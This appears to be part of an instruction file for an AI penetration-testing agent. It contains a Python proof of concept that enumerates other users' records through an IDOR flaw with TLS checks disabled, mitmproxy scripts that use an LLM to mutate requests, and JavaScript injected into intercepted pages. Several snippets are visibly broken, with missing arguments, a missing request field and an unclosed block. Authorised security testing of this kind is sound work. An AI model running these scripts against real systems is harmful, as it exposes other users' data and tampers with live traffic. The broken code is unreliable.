## Example PoC Structure

```python
"""
PoC: IDOR on /api/users/{id}
Finding: FINDING-001 from security_report.md
Severity: High

Tests whether any authenticated user can access other users' data
by enumerating user IDs in the /api/users/{id} endpoint.

Usage: python3 poc_idor_user_id.py
"""

import requests
import warnings
warnings.filterwarnings('ignore')

TARGET = "https://api.example.com"
PROXY = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
AUTH_TOKEN = "Bearer <your-token-here>"
YOUR_USER_ID = 1
TEST_IDS = [2, 3, 4, 5, 100]

def test_idor():
    headers = {"Authorization": AUTH_TOKEN}
    for uid in TEST_IDS:
        r = requests.get(f"{TARGET}/api/users/{uid}", headers=headers, proxies=PROXY, verify=False)
        if r.status_code == 200:
            print(f"[VULNERABLE] User ID {uid} accessible: {r.text[:200]}")
        else:
            print(f"[BLOCKED] User ID {uid} -> {r.status_code}")

if __name__ == "__main__":
    test_idor()
```

## Script Helpers (for mitmproxy intercept scripts used in PoCs)

If a PoC uses a mitmproxy intercept script to manipulate traffic, these helpers are **pre-injected** — do NOT import them.

### `llm_complete(prompt, system=None)` -> str  [BLOCKING]
### `llm_structured(prompt, schema, system=None)` -> dict  [BLOCKING]
### `llm_complete_async(prompt, callback, system=None)` -> None  [NON-BLOCKING, PROXY-SIDE LOG ONLY]
### `bs4_parse(html, selector=None)` -> dict
### `inject_script(flow, js_code)` -> None  [TRUE NON-BLOCKING — BROWSER CALLS LLM]

**CRITICAL: You cannot modify `flow.response` after the hook returns.** The response is already sent. Any callback that tries to edit it will silently do nothing.

#### When to use which pattern

- Rewrite request/response based on LLM output  ->  llm_complete() or llm_structured()  [blocking]
- Log/alert from proxy, no browser UI needed     ->  llm_complete_async()               [proxy-side only]
- Show LLM result in the browser page            ->  inject_script()                    [browser calls LLM itself]

```python
# phase: request — LLM-guided IDOR fuzzing (blocking, modifies request body)
import json
if flow.request.content and "/api/users/" in flow.request.path:
    try:
        data = flow.request.json()
        mutated_str = llm_complete(
            f"Produce a JSON variant of this object that may trigger an IDOR by changing user IDs: {json.dumps(data)}"
        )
        flow.request.set_text(mutated_str)
    except Exception:
        pass
```

```python
# phase: response — async: log sensitive data check to proxy console (no browser UI)
ct = flow.response.headers.get("content-type","") if flow.response else ""
if "text/html" in ct:
    parsed = bs4_parse(flow.response.text)
    def on_result(text):
        ctx.log.warn(f"[PoC] {flow.request.host}: {text}")
        # NOTE: do NOT modify flow.response here — it is already sent
    llm_complete_async(
        f"Does this page expose sensitive data or credentials? {parsed['text'][:2000]}",

    )
```

```python
# phase: response — inject_script: show LLM analysis as overlay in the browser
ct = flow.response.headers.get("content-type","") if flow.response else ""
if "text/html" in ct:
    inject_script(flow, """
    (async () => {
        await new Promise(r => {
            if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', r);
            else r();
        });
        const resp = await fetch('http://127.0.0.1:47821/v1/complete/structured', {
            method: 'POST', headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({

                schema: {type:'object',properties:{sensitive:{type:'boolean'},finding:{type:'string'}},required:['sensitive','finding']}
            })
        });
        const {result} = await resp.json();
        if (result.sensitive) {
            const el = document.createElement('div');
            el.style.cssText = 'position:fixed;bottom:16px;right:16px;z-index:2147483647;background:#dc2626;color:#fff;padding:10px 14px;border-radius:6px;font:13px sans-serif;max-width:320px';
            el.textContent = '[PoC] Sensitive: ' + result.finding;

    })();
    """)
```
